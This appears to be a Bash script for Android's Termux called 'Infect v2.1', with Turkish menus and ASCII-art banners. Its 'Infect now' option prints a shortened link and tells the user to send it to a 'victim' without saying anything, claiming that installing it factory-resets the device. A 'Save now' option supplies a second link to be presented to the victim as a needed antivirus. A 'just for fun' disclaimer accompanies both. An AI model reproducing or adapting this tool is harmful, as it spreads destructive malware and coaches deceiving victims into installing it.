
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
vid
echo -e '\e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   Infect v2.1      @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        Mehmet Aktas
'
echo " " 
echo -e "$red                       ▶Coded by$grn AKTAS$red◀$rset"
echo -e "$red                      ⫸$ylo  Mehmet aktas$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Onları eğlenceyle enfekte edin]$rset"
echo " "
echo " "
}
baner1(){
clear
echo -e '\e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   Infect v2.2      @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        Mehmet Aktaş
'
echo " " 
echo -e "$red                       ▶Coded by$grn AKTAŞ$red◀$rset"
echo -e "$red                      ⫸$ylo  Mehmet Aktas$red ⫷$rset"
echo 
# Functions
echo -e "$red                    [Onları eğlenceyle enfekte edin]$rset"
echo " "
echo " "
}
menu(){
echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Infect now"
echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Subscribe"
echo -e "$red                        ➡$cyan [\e[92m6\e[96m] More"
echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat"
echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
echo " "
echo " "
echo -e "$grn               >＞＞＞＞＞$ylo [SEÇME]$grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[92m#SELECT OPTION\e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
about
elif [ $optnz = "4" ];
then
upd
elif [ $optnz = "5" ];
then
am start -a android.intent.action.VIEW -d https://instagram.com/dr.mehmetaktass?utm_medium=copy_link > /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
am start -a android.intent.action.VIEW -d https://github.com/Drmehmetaktass/telefon-hack > /dev/null 2>&1
banner
menu
elif [ $optnz = "7" ];
then
am start -a android.intent.action.VIEW -d https://instagram.com/dr.mehmetaktass?utm_medium=copy_link > /dev/null 2>&1
banner
menu
elif [ $optnz = "8" ];
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[91m 😈 Aşağıdaki bağlantıyı kopyalayın ve kurbanınıza gönderin ve ona hiçbir şey söyleme. 
onun içine yüklediğinde cihaz fabrika ayarlarına sıfırlanacak ve çok daha fazlası olacak.
                                 👇👇👇

         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m

                                 👆👆👆
Birilerine zarar vermek için değil sadece eğlence amaçlı kullanın 😇✌️. 
Ve herhangi bir kayıptan kanalımız sorumlu değildir. bu komut dosyasıyla başkalarına yaparsın."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo -e '\e[92m 
                    _  _  _____  ____  ____ 
                   ( \( )(  _  )(_  _)( ___)
                    )  (  )(_)(   )(   )__) 
                   (_)\_)(_____) (__) (____) '
echo " "
echo " "
echo -e "\e[93m  Aşağıdaki bağlantıyı kopyalayın ve kurbanınıza gönderin ve ona söyleyin bu uygulamayı yüklemesi gerektiğini, aksi takdirde cihaz kurtarılmayacak.(Antivirüs)
                    👇👇👇

        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m

                    👆👆👆
Birilerine zarar vermek için değil sadece eğlence amaçlı kullanın 😇✌️.
 Ve kanalımız hiçbir şekilde sorumlu değildir. bu komut dosyasıyla başkalarına yaptığınız kayıp."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
         ──▐─▌──▐─▌──
         ─▐▌─▐▌▐▌─▐▌─
         ─█▄▀▄██▄▀▄█─
         ──▄──██▌─▄──
         ▄▀─█▀██▀█─▀▄
         ▐▌▐▌─▐▌─▐▌▐▌
         ─▐─█────█─▌─
         ────▌──▐────
'
echo -e "\e[93m                  BENİ BULMAK İÇİN \e[https://instagram.com/dr.mehmetaktass?utm_medium=copy_link" | pv -qL 10
echo -e "\e[93m           BEN   \e[92mMEHMET AKTAŞ" | pv -qL 10
echo -e "\e[93m       BEN \e[92mGEEK\e[93m BİRÇOK HEYECANLA" | pv -qL 10
echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
echo -e "\e[93m         OOPS... BUNUN İÇİN ÇOK ŞEY KONUŞUYORUM " | pv -qL 10
echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
echo -e "\e[93m        MY WEBSITE:\e[92m https://instagram.com/dr.mehmetaktass?utm_medium=copy_link\e[0m" | pv -qL 10
echo -e "\e[92m                GRŞ😉.............." | pv -qL 10
sleep 6.0
banner
menu
}
upd(){
if [ -d "$HOME/infect" ];
then
cd $HOME
rm -rf infect
elif [ -d "$HOME/Infect" ];
then
cd $HOME
rm -rf Infect
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/Drmehmetaktass/telefon-hack 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd infect
bash infect.sh
}
vid(){
FILE=$HOME/infect/noob.noob
if [ -f "$FILE" ]; then
pop
else
echo
fi
}
pop(){
clear
echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
echo -e "\e[96m                ║  \e[93mHAI,YENİ YÜKLEDİM\e[96m VIDEO   ║\e[0m"
echo -e "\e[96m                ║      YENİ VİDEOYU ŞİMDİ İZLEYİN.....!    ║\e[0m"
echo -e "\e[96m                ║                                   ║\e[0m"
echo -e "\e[96m                ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║        Select \e[91mt\e[96m to cancel\e[96m         ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║     Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
read p
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d https://github.com/Drmehmetaktass/telefon-hack 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
then
clear
baner1
menu
elif [ "$p" = "z" ];
then
cd $HOM/infect
rm noob.noob
banner
menu
else
banner
menu
exit
fi
}
banner
menu
